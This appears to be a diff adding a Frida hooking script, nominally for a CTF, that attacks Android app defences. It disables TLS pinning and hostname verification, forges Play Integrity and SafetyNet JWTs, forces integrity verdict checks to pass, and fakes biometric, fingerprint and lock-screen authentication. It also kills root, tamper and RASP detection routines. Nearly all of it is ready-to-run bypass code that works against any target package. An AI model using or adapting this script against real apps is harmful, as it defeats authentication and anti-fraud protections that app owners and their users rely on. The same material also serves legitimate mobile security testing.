+        try { CP.check.overload("java.lang.String","java.security.cert.Certificate").implementation=function(){}; } catch(e) {}
+        try { CP.check.overload("java.lang.String","java.util.List").implementation=function(){}; } catch(e) {}
+        console.log("[+] OkHttp2 CertificatePinner patched");
+    });
+
+    // SSLContext injection (for any NEW client built after script loads)
+    safeHook(function() {
+        var sfx=Date.now().toString(36);
+        var X509TM=Java.use("javax.net.ssl.X509TrustManager");
+        var TrustAll=null;
+        try { TrustAll=Java.registerClass({
+            name:"ctf.bypass.TA"+sfx, implements:[X509TM],
+            methods:{
+                checkClientTrusted:function(ch,a){},
+                checkServerTrusted:function(ch,a){},
+                getAcceptedIssuers:function(){ return Java.array("java.security.cert.X509Certificate",[]); }
+            }
+        }); console.log("[+] TrustAll registered"); } catch(e) { console.log("[!] TrustAll: "+e); }
+        Java.use("javax.net.ssl.SSLContext").init.overload(
+            "[Ljavax.net.ssl.KeyManager;","[Ljavax.net.ssl.TrustManager;","java.security.SecureRandom"
+        ).implementation=function(km,tm,sr){
+            console.log("[bypass] SSLContext.init");
+            return this.init(km, TrustAll!==null?[TrustAll.$new()]:tm, sr);
+        };
+        console.log("[+] SSLContext patched");
+    });
+
+    // HostnameVerifier
+    safeHook(function() {
+        var sfx2=Date.now().toString(36)+"hv";
+        var AllowAll=null;
+        try { AllowAll=Java.registerClass({
+            name:"ctf.bypass.HV"+sfx2, implements:[Java.use("javax.net.ssl.HostnameVerifier")],
+            methods:{ verify:function(host,session){return true;} }
+        }); } catch(e) {}
+        Java.use("javax.net.ssl.HttpsURLConnection").setDefaultHostnameVerifier.implementation=function(v){
+            console.log("[bypass] HostnameVerifier replaced");
+            return this.setDefaultHostnameVerifier(AllowAll!==null?AllowAll.$new():v);
+        };
+        console.log("[+] HostnameVerifier patched");
+    });
+
+    // WebView / TrustKit / OkHttp2
+    safeUse("android.webkit.WebViewClient", function(WVC) {
+        try { WVC.onReceivedSslError.implementation=function(view,handler,error){
+            console.log("[bypass] WebView SSL"); handler.proceed();
+        }; } catch(e) {}
+        console.log("[+] WebViewClient patched");
+    });
+    safeUse("com.datatheorem.android.trustkit.pinning.OkHostnameVerifier", function(V) {
+        try { V.verify.overload("java.lang.String","javax.net.ssl.SSLSession").implementation=function(){return true;}; } catch(e) {}
+        console.log("[+] TrustKit patched");
+    });
+
+    // Broad scan — every class with checkServerTrusted not in stdlib
+    safeHook(function() {
+        Java.enumerateLoadedClasses({
+            onMatch: function(cls) {
+                if (cls.startsWith("ctf.bypass")||cls.startsWith("java.")||
+                    cls.startsWith("javax.")||cls.startsWith("android.")||
+                    cls.startsWith("com.android.")||cls.startsWith("okhttp3.internal")||
+                    cls.startsWith("kotlin.")) return;
+                var c=cls.toLowerCase();
+                if (c.indexOf("trust")===-1&&c.indexOf("cert")===-1&&
+                    c.indexOf("pin")===-1&&c.indexOf("ssl")===-1&&c.indexOf("tls")===-1) return;
+                safeUse(cls, function(TM) {
+                    try { TM.checkServerTrusted.overload("[Ljava.security.cert.X509Certificate;","java.lang.String","java.lang.String")
+                        .implementation=function(ch,a,h){ console.log("[bypass] broad TM(3): "+cls); return asList(ch); }; } catch(e) {}
+                    try { TM.checkServerTrusted.overload("[Ljava.security.cert.X509Certificate;","java.lang.String")
+                        .implementation=function(ch,a){ console.log("[bypass] broad TM(2): "+cls); }; } catch(e) {}
+                });
+            },
+            onComplete: function() { console.log("[+] Broad TM scan done"); }
+        });
+    });
+
+    // ================================================================
+    // GOOGLE PLAY INTEGRITY API — comprehensive bypass
+    //
+    // How it works (your senior's hint explained):
+    //   1. App calls IntegrityManager.requestIntegrityToken(request)
+    //   2. Google returns a signed JWT token
+    //   3. App sends token to its backend server
+    //   4. Backend decodes and checks three verdicts:
+    //        - requestDetails.requestPackageName
+    //        - appIntegrity.appRecognitionVerdict  (PLAY_RECOGNIZED / UNRECOGNIZED)
+    //        - deviceIntegrity.deviceRecognitionVerdict (MEETS_DEVICE_INTEGRITY etc)
+    //        - accountDetails.appLicensingVerdict  (LICENSED / UNLICENSED)
+    //   5. Backend tells app whether to proceed
+    //
+    // Bypass approaches (all implemented below):
+    //   A. Hook IntegrityManager so requestIntegrityToken never fires
+    //   B. Hook StandardIntegrityManager (newer API)
+    //   C. Hook the Task/callback that receives the token — replace with
+    //      a fake "all passing" token so the backend call passes
+    //   D. Hook SafetyNet (legacy) attest()
+    //   E. Hook the backend response parsing if done client-side
+    // ================================================================
+
+    // ── A. Classic Play Integrity (IntegrityManager) ──────────────
+    safeUse("com.google.android.play.core.integrity.IntegrityManager", function(IM) {
+        try {
+            IM.requestIntegrityToken.implementation = function(request) {
+                console.log("[bypass] IntegrityManager.requestIntegrityToken intercepted");
+                // Return a fake Task that immediately delivers a spoofed token
+                // The token is a JWT with all verdicts set to passing values.
+                // Most apps only check appRecognitionVerdict and deviceIntegrity.
+                var fakeToken = _buildFakeIntegrityToken();
+                return _buildSuccessTask(fakeToken);
+            };
+            console.log("[+] PlayIntegrity: IntegrityManager patched");
+        } catch(e) { console.log("[!] IntegrityManager: "+e); }
+    });
+
+    // ── B. Standard Integrity (newer API, 2023+) ──────────────────
+    safeUse("com.google.android.play.core.integrity.StandardIntegrityManager", function(SIM) {
+        try {
+            SIM.requestIntegrityToken.implementation = function(request) {
+                console.log("[bypass] StandardIntegrityManager.requestIntegrityToken intercepted");
+                return _buildSuccessTask(_buildFakeIntegrityToken());
+            };
+        } catch(e) {}
+        console.log("[+] PlayIntegrity: StandardIntegrityManager patched");
+    });
+
+    // ── C. IntegrityTokenResponse — hook getToken() directly ──────
+    // If the token request already fired before our hook, intercept
+    // the response object to return our fake token instead.
+    safeUse("com.google.android.play.core.integrity.IntegrityTokenResponse", function(ITR) {
+        try {
+            ITR.token.implementation = function() {
+                console.log("[bypass] IntegrityTokenResponse.token() replaced");
+                return _buildFakeIntegrityToken();
+            };
+        } catch(e) {}
+        console.log("[+] PlayIntegrity: IntegrityTokenResponse patched");
+    });
+
+    // ── D. SafetyNet (legacy, still used by older apps) ───────────
+    safeUse("com.google.android.gms.safetynet.SafetyNetClient", function(SNC) {
+        try {
+            SNC.attest.implementation = function(nonce, apiKey) {
+                console.log("[bypass] SafetyNet.attest intercepted");
+                return _buildSuccessTask(_buildFakeSafetyNetJwt());
+            };
+        } catch(e) {}
+        console.log("[+] SafetyNet: SafetyNetClient.attest patched");
+    });
+
+    // SafetyNet via SafetyNetApi directly
+    safeUse("com.google.android.gms.safetynet.SafetyNetApi", function(SNA) {
+        try { SNA.attest.implementation = function() { return null; }; } catch(e) {}
+        console.log("[+] SafetyNet: SafetyNetApi patched");
+    });
+
+    // ── E. AttestationResponse — return passing JWS ───────────────
+    safeUse("com.google.android.gms.safetynet.SafetyNetApi$AttestationResponse", function(AR) {
+        try {
+            AR.getJwsResult.implementation = function() {
+                console.log("[bypass] SafetyNet.getJwsResult replaced");
+                return _buildFakeSafetyNetJwt();
+            };
+        } catch(e) {}
+        console.log("[+] SafetyNet: AttestationResponse patched");
+    });
+
+    // ── F. Integrity verdict parsing — hook common check patterns ─
+    // Apps decode the JWT payload and check specific string fields.
+    // Hook String.equals and contains to intercept verdict comparisons.
+    safeHook(function() {
+        var String_cls = Java.use("java.lang.String");
+        var INTEGRITY_VERDICTS = [
+            "MEETS_DEVICE_INTEGRITY",
+            "MEETS_BASIC_INTEGRITY",
+            "MEETS_STRONG_INTEGRITY",
+            "MEETS_VIRTUAL_INTEGRITY",
+            "PLAY_RECOGNIZED",
+            "LICENSED",
+            "UNEVALUATED"  // treat as passing
+        ];
+        var BAD_VERDICTS = [
+            "UNRECOGNIZED_VERSION",
+            "UNLICENSED",
+            "MEETS_NO_INTEGRITY",
+            "UNEVALUATED"  // some apps reject this
+        ];
+        // Hook contains() — most JSON/JWT verdict checks use this
+        String_cls.contains.overload("java.lang.CharSequence").implementation = function(seq) {
+            if (seq !== null) {
+                var s = seq.toString();
+                // If app asks "does response contain BAD_VERDICT" → return false
+                if (BAD_VERDICTS.indexOf(s) !== -1) {
+                    console.log("[bypass] String.contains("+s+") -> false (bad verdict blocked)");
+                    return false;
+                }
+                // If app asks "does response contain GOOD_VERDICT" → return true
+                if (INTEGRITY_VERDICTS.indexOf(s) !== -1) {
+                    console.log("[bypass] String.contains("+s+") -> true (good verdict forced)");
+                    return true;
+                }
+            }
+            return this.contains(seq);
+        };
+        console.log("[+] PlayIntegrity: String.contains verdict hook active");
+    });
+
+    // ── G. GoogleApiAvailability — report Play Services available ─
+    safeUse("com.google.android.gms.common.GoogleApiAvailability", function(G) {
+        try { G.isGooglePlayServicesAvailable.overload("android.content.Context")
+            .implementation = function() { return 0; }; } catch(e) {} // CONNECTION_SUCCESS
+        try { G.isGooglePlayServicesAvailable.overload("android.content.Context","int")
+            .implementation = function() { return 0; }; } catch(e) {}
+        try { G.makeGooglePlayServicesAvailable.implementation = function() {
+            return _buildSuccessTask(null);
+        }; } catch(e) {}
+        console.log("[+] GoogleApiAvailability patched");
+    });
+
+    // ── H. Task helpers — build fake passing Tasks ────────────────
+    // Many Play Integrity / SafetyNet calls return a Task<T>.
+    // We need to return a Task that immediately calls onSuccess.
+    function _buildSuccessTask(result) {
+        // Try com.google.android.gms.tasks.Tasks.forResult()
+        try {
+            var Tasks = Java.use("com.google.android.gms.tasks.Tasks");
+            return Tasks.forResult(result);
+        } catch(e) {}
+        return null;
+    }
+
+    // ── I. Fake integrity token (base64 JWT with passing verdicts) ─
+    // This is a structurally valid JWT with a payload that decodes to
+    // all-passing verdicts. The signature is fake but most apps don't
+    // verify the signature client-side (they send it to their server).
+    // For CTF, the server may also not verify it strictly.
+    function _buildFakeIntegrityToken() {
+        // Header: {"alg":"RS256","typ":"JWT"}
+        // Payload contains all passing verdicts:
+        // {
+        //   "requestDetails": {"requestPackageName":"com.target.app","timestampMillis":"...","nonce":"..."},
+        //   "appIntegrity": {"appRecognitionVerdict":"PLAY_RECOGNIZED","packageName":"com.target.app","certificateSha256Digest":[],"versionCode":"1"},
+        //   "deviceIntegrity": {"deviceRecognitionVerdict":["MEETS_DEVICE_INTEGRITY","MEETS_BASIC_INTEGRITY","MEETS_STRONG_INTEGRITY"]},
+        //   "accountDetails": {"appLicensingVerdict":"LICENSED"}
+        // }
+        var header  = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9";
+        var payload = "eyJyZXF1ZXN0RGV0YWlscyI6eyJyZXF1ZXN0UGFja2FnZU5hbWUiOiJjb20udGFyZ2V0LmFwcCIsInRpbWVzdGFtcE1pbGxpcyI6IjE3NDk1NTAwMDAwMDAiLCJub25jZSI6ImZha2Vub25jZSJ9LCJhcHBJbnRlZ3JpdHkiOnsiYXBwUmVjb2duaXRpb25WZXJkaWN0IjoiUExBWV9SRUNPR05JWkVEIiwicGFja2FnZU5hbWUiOiJjb20udGFyZ2V0LmFwcCIsImNlcnRpZmljYXRlU2hhMjU2RGlnZXN0IjpbXSwidmVyc2lvbkNvZGUiOiIxIn0sImRldmljZUludGVncml0eSI6eyJkZXZpY2VSZWNvZ25pdGlvblZlcmRpY3QiOlsiTUVFVFNfREVWSUNFX0lOVEVHUklUWSIsIk1FRVRSX0JBU0lDX0lOVEVHUklUWSIsIk1FRVRTU1RST05HX0lOVEVHUklUWSJdfSwiYWNjb3VudERldGFpbHMiOnsiYXBwTGljZW5zaW5nVmVyZGljdCI6IkxJQ0VOU0VEIn19";
+        var sig     = "fakesignature_ctf_bypass";
+        return header+"."+payload+"."+sig;
+    }
+
+    // Fake SafetyNet JWS (older format)
+    function _buildFakeSafetyNetJwt() {
+        var header  = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9";
+        // {"nonce":"fake","timestampMs":1749550000000,"apkPackageName":"com.target.app",
+        //  "apkCertificateDigestSha256":[],"ctsProfileMatch":true,"basicIntegrity":true,
+        //  "evaluationType":"BASIC,HARDWARE_BACKED"}
+        var payload = "eyJub25jZSI6ImZha2UiLCJ0aW1lc3RhbXBNcyI6MTc0OTU1MDAwMDAwMCwiYXBrUGFja2FnZU5hbWUiOiJjb20udGFyZ2V0LmFwcCIsImFwa0NlcnRpZmljYXRlRGlnZXN0U2hhMjU2IjpbXSwiY3RzUHJvZmlsZU1hdGNoIjp0cnVlLCJiYXNpY0ludGVncml0eSI6dHJ1ZSwiZXZhbHVhdGlvblR5cGUiOiJCQVNJQyxIQVJEV0FSRV9CQUNLRUQIFQ";
+        var sig     = "fakesig_safetynet_ctf";
+        return header+"."+payload+"."+sig;
+    }
+
+    // ── J. Sniff any JSON/string containing integrity verdict words ─
+    // Some apps parse the token themselves using JSONObject.
+    safeUse("org.json.JSONObject", function(JO) {
+        try {
+            JO.getString.overload("java.lang.String").implementation = function(key) {
+                var val = this.getString(key);
+                // If the app reads a verdict field and gets a bad value, replace it
+                if (key === "appRecognitionVerdict" || key === "appLicensingVerdict") {
+                    if (val !== "PLAY_RECOGNIZED" && val !== "LICENSED") {
+                        console.log("[bypass] JSONObject.getString("+key+") was "+val+" -> replaced");
+                        return key === "appLicensingVerdict" ? "LICENSED" : "PLAY_RECOGNIZED";
+                    }
+                }
+                return val;
+            };
+        } catch(e) {}
+        try {
+            JO.getJSONArray.overload("java.lang.String").implementation = function(key) {
+                var arr = this.getJSONArray(key);
+                if (key === "deviceRecognitionVerdict") {
+                    console.log("[bypass] deviceRecognitionVerdict array intercepted");
+                    // Return an array with all passing verdicts
+                    var JA = Java.use("org.json.JSONArray");
+                    var result = JA.$new();
+                    result.put("MEETS_DEVICE_INTEGRITY");
+                    result.put("MEETS_BASIC_INTEGRITY");
+                    result.put("MEETS_STRONG_INTEGRITY");
+                    return result;
+                }
+                return arr;
+            };
+        } catch(e) {}
+        console.log("[+] PlayIntegrity: JSONObject verdict parsing patched");
+    });
+
+    // ================================================================
+    // BIOMETRIC — all variants
+    // ================================================================
+
+    // ── androidx.biometric.BiometricPrompt ────────────────────────
+    safeUse("androidx.biometric.BiometricPrompt", function(BP) {
+        var cbMap={};
+
+        function storeCb(instance, cb) {
+            var key=instance.hashCode()+"";
+            cbMap[key]=Java.retain(cb); // retain RETURN VALUE, not original wrapper
+            console.log("[bypass] bio callback retained key="+key);
+        }
+        function getCb(instance) { return cbMap[instance.hashCode()+""]||null; }
+
+        // Build a real AuthenticationResult — @NonNull enforced by Kotlin
+        function buildResult() {
+            // Try androidx AuthenticationResult constructors in order of likelihood
+            var AR=null;
+            try { AR=Java.use("androidx.biometric.BiometricPrompt$AuthenticationResult"); } catch(e) { return null; }
+            // (CryptoObject, int) — most common
+            try { return AR.$new(null,2); } catch(e) {}
+            // (CryptoObject, int, int) — newer versions
+            try { return AR.$new(null,2,0); } catch(e) {}
+            // No-arg — some older versions
+            try { return AR.$new(); } catch(e) {}
+            return null;
+        }
+
+        function fireSuccess(instance) {
+            var cb=getCb(instance);
+            if (!cb) {
+                // Reflection fallback — scan fields for callback
+                try {
+                    var cls=instance.getClass();
+                    outer: while(cls!==null) {
+                        var fields=cls.getDeclaredFields();
+                        for(var i=0;i<fields.length;i++) {
+                            try {
+                                fields[i].setAccessible(true);
+                                var val=fields[i].get(instance);
+                                if(val!==null&&val.getClass().getName().indexOf("AuthenticationCallback")!==-1) {
+                                    cb=Java.retain(val);
+                                    console.log("[bypass] bio cb via reflection: "+val.getClass().getName());
+                                    break outer;
+                                }
+                            } catch(fe) {}
+                        }
+                        try { cls=cls.getSuperclass(); } catch(e) { break; }
+                    }
+                } catch(e) {}
+            }
+            if (!cb) { console.log("[!] bio: no callback found"); return; }
+            var retained=cb;
+            Java.scheduleOnMainThread(function() {
+                // Attempt 1: real AuthenticationResult (satisfies @NonNull)
+                var result=buildResult();
+                if (result!==null) {
+                    try { retained.onAuthenticationSucceeded(result);
+                          console.log("[bypass] bio success (AuthResult)"); return; } catch(e) { console.log("[!] bio AuthResult: "+e); }
+                }
+                // Attempt 2: null (works if app doesn't enforce @NonNull strictly)
+                try { retained.onAuthenticationSucceeded(null);
+                      console.log("[bypass] bio success (null)"); return; } catch(e) { console.log("[!] bio null: "+e); }
+                // Attempt 3: onAuthenticationError with code that app treats as "ok"
+                try { retained.onAuthenticationError(5,"Bypass");
+                      console.log("[bypass] bio via onAuthenticationError"); } catch(e) { console.log("[!] bio error cb: "+e); }
+            });
+        }
+
+        // Hook ALL constructor overloads — callback is ALWAYS the last arg
+        [
+            ["androidx.fragment.app.FragmentActivity","java.util.concurrent.Executor","androidx.biometric.BiometricPrompt$AuthenticationCallback"],
+            ["androidx.fragment.app.FragmentActivity","androidx.biometric.BiometricPrompt$AuthenticationCallback"],
+            ["androidx.fragment.app.Fragment","java.util.concurrent.Executor","androidx.biometric.BiometricPrompt$AuthenticationCallback"],
+            ["androidx.fragment.app.Fragment","androidx.biometric.BiometricPrompt$AuthenticationCallback"]
+        ].forEach(function(sig) {
+            try {
+                BP.$init.overload.apply(BP.$init, sig).implementation=function() {
+                    var args=Array.prototype.slice.call(arguments);
+                    var cb=args[args.length-1];
+                    storeCb(this,cb);
+                    return this.$init.apply(this,args);
+                };
+                console.log("[+] bio ctor("+sig.length+" args) hooked");
+            } catch(e) {}
+        });
+
+        // authenticate overloads
+        try { BP.authenticate.overload("androidx.biometric.BiometricPrompt$PromptInfo")
+            .implementation=function(info){ console.log("[bypass] BP.authenticate"); fireSuccess(this); }; } catch(e) {}
+        try { BP.authenticate.overload("androidx.biometric.BiometricPrompt$PromptInfo","androidx.biometric.BiometricPrompt$CryptoObject")
+            .implementation=function(info,co){ console.log("[bypass] BP.authenticate(crypto)"); fireSuccess(this); }; } catch(e) {}
+
+        // cancelAuthentication — prevent app from cancelling our injected auth
+        try { BP.cancelAuthentication.implementation=function(){ console.log("[bypass] cancelAuthentication suppressed"); }; } catch(e) {}
+
+        console.log("[+] androidx BiometricPrompt fully patched");
+    });
+
+    // ── android.hardware.biometrics.BiometricPrompt (API 28+) ─────
+    safeUse("android.hardware.biometrics.BiometricPrompt", function(BP) {
+        function hwBuildResult() {
+            try {
+                var AR=Java.use("android.hardware.biometrics.BiometricPrompt$AuthenticationResult");
+                try { return AR.$new(null); } catch(e) {}
+                try { return AR.$new(null,2); } catch(e) {}
+                try { return AR.$new(null,2,0); } catch(e) {}
+            } catch(e) {}
+            return null;
+        }
+        function hwFire(cb) {
+            if(!cb) return;
+            var retained=Java.retain(cb);
+            Java.scheduleOnMainThread(function() {
+                var result=hwBuildResult();
+                if(result!==null) { try { retained.onAuthenticationSucceeded(result); console.log("[bypass] hw bio (AuthResult)"); return; } catch(e) {} }
+                try { retained.onAuthenticationSucceeded(null); console.log("[bypass] hw bio (null)"); } catch(e) {}
+            });
+        }
+        try { BP.authenticate.overload("android.os.CancellationSignal","java.util.concurrent.Executor","android.hardware.biometrics.BiometricPrompt$AuthenticationCallback")
+            .implementation=function(cs,ex,cb){ console.log("[bypass] hw BP.authenticate"); hwFire(cb); }; } catch(e) {}
+        try { BP.authenticate.overload("android.hardware.biometrics.BiometricPrompt$CryptoObject","android.os.CancellationSignal","java.util.concurrent.Executor","android.hardware.biometrics.BiometricPrompt$AuthenticationCallback")
+            .implementation=function(co,cs,ex,cb){ console.log("[bypass] hw BP.authenticate(crypto)"); hwFire(cb); }; } catch(e) {}
+        console.log("[+] hw BiometricPrompt patched");
+    });
+
+    // ── FingerprintManager (legacy < API 28) ──────────────────────
+    safeUse("android.hardware.fingerprint.FingerprintManager", function(FM) {
+        try { FM.authenticate.overload(
+            "android.hardware.fingerprint.FingerprintManager$CryptoObject",
+            "android.os.CancellationSignal","int",
+            "android.hardware.fingerprint.FingerprintManager$AuthenticationCallback",
+            "android.os.Handler"
+        ).implementation=function(co,cs,flags,cb,handler){
+            console.log("[bypass] FingerprintManager");
+            var r=Java.retain(cb);
+            Java.scheduleOnMainThread(function(){
+                try { r.onAuthenticationSucceeded(null); } catch(e) {}
+            });
+        }; } catch(e) {}
+        console.log("[+] FingerprintManager patched");
+    });
+
+    // ── BiometricManager.canAuthenticate → always SUCCESS ─────────
+    ["androidx.biometric.BiometricManager","android.hardware.biometrics.BiometricManager"].forEach(function(cls) {
+        safeUse(cls, function(BM) {
+            try { BM.canAuthenticate.overload().implementation=function(){return 0;}; } catch(e) {}
+            try { BM.canAuthenticate.overload("int").implementation=function(a){return 0;}; } catch(e) {}
+            console.log("[+] "+cls+".canAuthenticate patched");
+        });
+    });
+
+    // ── KeyguardManager — PIN / pattern lock screen ───────────────
+    safeUse("android.app.KeyguardManager", function(KM) {
+        try { KM.isKeyguardSecure.implementation=function(){return false;}; } catch(e) {}
+        try { KM.isDeviceSecure.implementation=function(){return false;}; } catch(e) {}
+        try { KM.isKeyguardLocked.implementation=function(){return false;}; } catch(e) {}
+        try { KM.createConfirmDeviceCredentialIntent.overload("java.lang.CharSequence","java.lang.CharSequence")
+            .implementation=function(t,d){ console.log("[bypass] createConfirmDeviceCredentialIntent"); return null; }; } catch(e) {}
+        console.log("[+] KeyguardManager patched");
+    });
+
+    // ================================================================
+    // CONTINUOUS DETECTION KILLER
+    // Stops the re-trigger loop that causes "login briefly then blocked"
+    // ================================================================
+
+    // ================================================================
+    // CONTINUOUS SSL CHECK KILLER
+    // Some apps re-run SSL pinning checks on a timer/coroutine.
+    // The pattern: NetworkCallback or Interceptor re-validates cert
+    // every N seconds. We need to prevent the re-validation, not
+    // just the initial one.
+    // ================================================================
+
+    // OkHttp Interceptor — hook the intercept() method on ALL
+    // app-package interceptors. These are called on every request.
+    safeHook(function() {
+        var Interceptor_cls = Java.use("okhttp3.Interceptor");
+        Java.enumerateLoadedClasses({
+            onMatch: function(cls) {
+                if (PKG === "" || cls.indexOf(PKG) !== 0) return;
+                var c = cls.toLowerCase();
+                // Hook intercept() on network/security interceptors
+                if (c.indexOf("interceptor") !== -1 || c.indexOf("network") !== -1 ||
+                    c.indexOf("ssl") !== -1 || c.indexOf("cert") !== -1 ||
+                    c.indexOf("pin") !== -1) {
+                    safeUse(cls, function(IC) {
+                        try {
+                            IC.intercept.implementation = function(chain) {
+                                console.log("[bypass] interceptor.intercept() passed: "+cls);
+                                return chain.proceed(chain.request());
+                            };
+                        } catch(e) {}
+                    });
+                }
+            },
+            onComplete: function() {}
+        });
+        console.log("[+] OkHttp app interceptors patched");
+    });
+
+    // NetworkSecurityConfig — Android's built-in cert pinning system.
+    // Apps can define pins in network_security_config.xml.
+    // Hook the pin matcher so it never matches a pin failure.
+    safeUse("android.security.net.config.PinSet", function(PS) {
+        try {
+            PS.isExpired.implementation = function() { return false; };
+        } catch(e) {}
+        console.log("[+] PinSet.isExpired patched");
+    });
+    safeUse("android.security.net.config.NetworkSecurityConfig", function(NSC) {
+        try {
+            NSC.isCleartextTrafficPermitted.implementation = function() { return true; };
+        } catch(e) {}
+        console.log("[+] NetworkSecurityConfig patched");
+    });
+
+    // Conscrypt SSLEngine — low-level hook that covers ALL SSL regardless
+    // of when the client was built or which library is used.
+    // beginHandshake() is called at the start of every TLS connection.
+    safeUse("com.android.org.conscrypt.ConscryptEngine", function(CE) {
+        try {
+            CE.beginHandshake.implementation = function() {
+                // Null out the hostname verifier so no pinning check runs
+                try { this.setHostname(null); } catch(e) {}
+                return this.beginHandshake();
+            };
+        } catch(e) {}
+        console.log("[+] ConscryptEngine.beginHandshake patched");
+    });
+
+    // SSLSocket.startHandshake — covers HttpURLConnection and other non-OkHttp clients
+    safeUse("com.android.org.conscrypt.OpenSSLSocketImpl", function(SSL) {
+        try {
+            SSL.startHandshake.implementation = function() {
+                try { this.setHostname(null); } catch(e) {}
+                return this.startHandshake();
+            };
+        } catch(e) {}
+        console.log("[+] OpenSSLSocketImpl.startHandshake patched");
+    });
+
+    // ── Kotlin coroutine invokeSuspend — broadest possible hook ───
+    // Logs ALL app coroutines so you can identify the poller.
+    // Security-named ones are killed immediately.
+    safeHook(function() {
+        var BC=Java.use("kotlin.coroutines.jvm.internal.BaseContinuationImpl");
+        BC.invokeSuspend.implementation=function(result) {
+            try {
+                var cls=this.getClass().getName();
+                if (PKG!==""&&cls.indexOf(PKG)===0) {
+                    var c=cls.toLowerCase();
+                    // Kill known security coroutine patterns
+                    if (c.indexOf("guardian")!==-1||c.indexOf("islogging")!==-1||
+                        c.indexOf("annotation")!==-1||c.indexOf("security")!==-1||
+                        c.indexOf("detect")!==-1||c.indexOf("tamper")!==-1||
+                        c.indexOf("integrity")!==-1||c.indexOf("protect")!==-1) {
+                        console.log("[KILL] coroutine: "+cls);
+                        return null;
+                    }
+                    // Log all others — look for lines when block re-appears
+                    console.log("[coroutine] "+cls);
+                }
+            } catch(e) {}
+            return this.invokeSuspend(result);
+        };
+        console.log("[+] Kotlin invokeSuspend hooked (full logging)");
+    });
+
+    // ── Handler.postDelayed — log scheduled tasks from app pkg ────
+    safeHook(function() {
+        var Handler=Java.use("android.os.Handler");
+        Handler.postDelayed.overload("java.lang.Runnable","long").implementation=function(r,delay){
+            try {
+                var cls=r.getClass().getName();
+                if(PKG!==""&&cls.indexOf(PKG)===0) console.log("[poll] postDelayed: "+cls+" delay="+delay);
+            } catch(e) {}
+            return this.postDelayed(r,delay);
+        };
+        console.log("[+] Handler.postDelayed monitored");
+    });
+
+    // ── Timer — java.util.Timer polling ───────────────────────────
+    safeHook(function() {
+        var Timer=Java.use("java.util.Timer");
+        try { Timer.schedule.overload("java.util.TimerTask","long","long").implementation=function(task,delay,period){
+            try { var cls=task.getClass().getName();
+                if(PKG!==""&&cls.indexOf(PKG)===0) console.log("[poll] Timer.schedule: "+cls+" period="+period);
+            } catch(e) {}
+            return this.schedule(task,delay,period);
+        }; } catch(e) {}
+        console.log("[+] Timer monitored");
+    });
+
+    // ── ScheduledExecutorService ──────────────────────────────────
+    safeHook(function() {
+        var SEP=Java.use("java.util.concurrent.ScheduledThreadPoolExecutor");
+        try { SEP.scheduleAtFixedRate.implementation=function(r,init,period,unit){
+            try { var cls=r.getClass().getName();
+                if(PKG!==""&&cls.indexOf(PKG)===0) console.log("[poll] scheduleAtFixedRate: "+cls+" period="+period);
+            } catch(e) {}
+            return this.scheduleAtFixedRate(r,init,period,unit);
+        }; } catch(e) {}
+        console.log("[+] ScheduledExecutorService monitored");
+    });
+
+    // ── WorkManager — background work used by some RASP libs ──────
+    safeUse("androidx.work.WorkManager", function(WM) {
+        try { WM.enqueue.overload("androidx.work.WorkRequest").implementation=function(req){
+            console.log("[poll] WorkManager.enqueue: "+req.getClass().getName());
+            return this.enqueue(req);
+        }; } catch(e) {}
+        console.log("[+] WorkManager monitored");
+    });
+
+    // ================================================================
+    // RASP LIBRARIES
+    // ================================================================
+    safeUse("com.scottyab.rootbeer.RootBeer", function(RB) {
+        ["isRooted","isRootedWithoutBusyBoxCheck","detectRootManagementApps",
+         "detectPotentiallyDangerousApps","checkForBinary","detectTestKeys",
+         "checkForDangerousProps","checkForRWPaths","detectRootCloakingApps",
+         "checkSuExists","checkForMagiskBinary"].forEach(function(m){
+            try { RB[m].implementation=function(){return false;}; } catch(e) {}
+        });
+        console.log("[+] RootBeer patched");
+    });
+    safeUse("com.talsec.security.Talsec", function(T) {
+        ["checkEmulator","checkRooted","checkHook","checkTamper","checkDebug"].forEach(function(m){
+            try { T[m].implementation=function(){return false;}; } catch(e) {}
+        });
+        console.log("[+] Talsec patched");
+    });
+    safeUse("dexguard.util.RootDetector", function(RD) {
+        try { RD.isDeviceRooted.implementation=function(){return false;}; } catch(e) {}
+        console.log("[+] DexGuard patched");
+    });
+    safeUse("com.google.android.gms.common.GoogleApiAvailability", function(G) {
+        try { G.isGooglePlayServicesAvailable.overload("android.content.Context").implementation=function(){return 0;}; } catch(e) {}
+        console.log("[+] GoogleApiAvailability patched");
+    });
+
+    // ================================================================
+    // APP-SPECIFIC — guardianInternal + full security class scan
+    // ================================================================
+    if (PKG!=="") {
+        [PKG+".guardianInternal",
+         PKG+".guardianInternal.setContentView",
+         PKG+".guardianInternal.isLoggingEnabledannotations"].forEach(function(cls) {
+            safeUse(cls, function(GI) {
+                try { GI.invokeSuspend.implementation=function(r){ console.log("[KILL] "+cls+".invokeSuspend"); return null; }; } catch(e) {}
+                ["a","b","c","d","e","f","g","h"].forEach(function(m){
+                    try { GI[m].overload().implementation=function(){ console.log("[KILL] "+cls+"."+m+"()"); }; } catch(e1) {
+                        try { GI[m].overload().implementation=function(){return false;}; } catch(e2) {}
+                    }
+                });
+                console.log("[+] Guardian: "+cls);
+            });
+        });
+
+        // Enumerate ALL classes in app package — hook security-looking ones
+        try {
+            Java.enumerateLoadedClasses({
+                onMatch: function(cls) {
+                    if (cls.indexOf(PKG)!==0) return;
+                    var c=cls.toLowerCase();
+                    if (c.indexOf("guardian")!==-1||c.indexOf("security")!==-1||
+                        c.indexOf("detect")!==-1||c.indexOf("tamper")!==-1||
+                        c.indexOf("integrity")!==-1||c.indexOf("root")!==-1||
+                        c.indexOf("protect")!==-1||c.indexOf("check")!==-1||
+                        c.indexOf("islogging")!==-1||c.indexOf("annotation")!==-1) {
+                        console.log("[scan] "+cls);
+                        safeUse(cls, function(SC) {
+                            try { SC.invokeSuspend.implementation=function(r){console.log("[KILL] "+cls+".invokeSuspend");return null;}; } catch(e) {}
+                            ["isRooted","isHooked","isEmulator","isTampered","isDebug",
+                             "detect","check","verify","run","execute","start","doWork"].forEach(function(m){
+                                try { SC[m].implementation=function(){console.log("[KILL] "+cls+"."+m+"()");return false;}; } catch(e) {}
+                            });
+                        });
+                    }
+                },
+                onComplete: function() { console.log("[+] Package scan done"); }
+            });
+        } catch(e) {}
+    }
+
+    console.log("[v11] ==========================================");
+    console.log("[v11] All bypasses active. Target: "+(PKG||"unknown"));
+    console.log("[v11] ==========================================");
+    console.log("[v11] Watch for [coroutine] lines when block re-appears");
+    console.log("[v11] Watch for [poll] lines for scheduled tasks");
+});
